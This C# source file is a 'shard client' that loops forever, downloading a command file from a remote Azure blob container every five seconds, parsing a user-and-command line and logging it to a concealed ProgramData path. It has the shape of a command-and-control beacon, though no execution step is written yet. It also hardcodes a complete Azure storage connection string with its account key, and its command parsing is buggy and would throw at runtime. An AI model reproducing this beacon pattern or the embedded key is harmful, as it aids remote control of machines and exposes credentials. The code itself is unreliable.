﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using Azure.Storage;
using Azure.Storage.Blobs;
using Azure.Storage.Blobs.Models;
using System.Net;
using HRSH_Shard_Client.tools;
using System.Threading;

namespace HRSH_Shard_Client
{
    internal class Program
    {
        private static readonly string logs = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\ssn\log.dat";
        private static readonly string connectionString = "DefaultEndpointsProtocol=https;AccountName=an0maly;AccountKey=JSG0oVViqz6/IwWfKnYzNQTCjNHSReKg6Thr1VvDXaty5PRlwBP92mQLUtz3XNsbGE37LhZO75HH+AStl0QZmg==;EndpointSuffix=core.windows.net";

        static void Main(string[] args)
        {
            LogEntry("Starting Up");

            LogEntry("Loading Commands.");
            commandHandler.loadCommands();

            start:

            RunCommand();
            Thread.Sleep(5000);

            goto start;
        }

        // Check if the log file exists before writing anything to it.
        private static void CheckLog()
        {
            if(!Directory.Exists(Path.GetDirectoryName(logs)))
            {
                Directory.CreateDirectory(Path.GetDirectoryName(logs));
            }

            if(!File.Exists(logs))
            {
                FileStream fs = File.Create(logs);
                fs.Dispose();
            }
        }

        // Add entry to log with given message and current time.
        private static void LogEntry(string logText)
        {
            CheckLog();
            string logentry = "[" + DateTime.Now.ToString() + "] " + logText;
            StreamWriter sw = File.AppendText(logs);
            sw.WriteLine(logentry);
            sw.Dispose();
        }

        private static void DeleteBlob(string blobName)
        {
            BlobServiceClient blobServiceClient = new BlobServiceClient(connectionString);
            string containerName = "commandbin";
            BlobContainerClient containerClient = blobServiceClient.GetBlobContainerClient(containerName);
            BlobClient blobClient = containerClient.GetBlobClient(blobName);
            if (blobClient.Exists())
            {
                blobClient.DeleteIfExists();
                LogEntry("Deleting command block.");
            }
            else
            {
                LogEntry("Command block not found.");
            }
        }

        private static void RunCommand()
        {
            string uri = "https://an0maly.blob.core.windows.net/commandbin/cmd.dat";
            WebClient client = new WebClient();
            string reply = client.DownloadString(uri);
            string usrName = reply.Substring(0, reply.IndexOf(':'));
            string cmd = reply.Substring(reply.IndexOf(':'), reply.Length);
            if (usrName == "curUsr")
            {
                LogEntry("Executing command: " + cmd);
            }
        }
    }
}
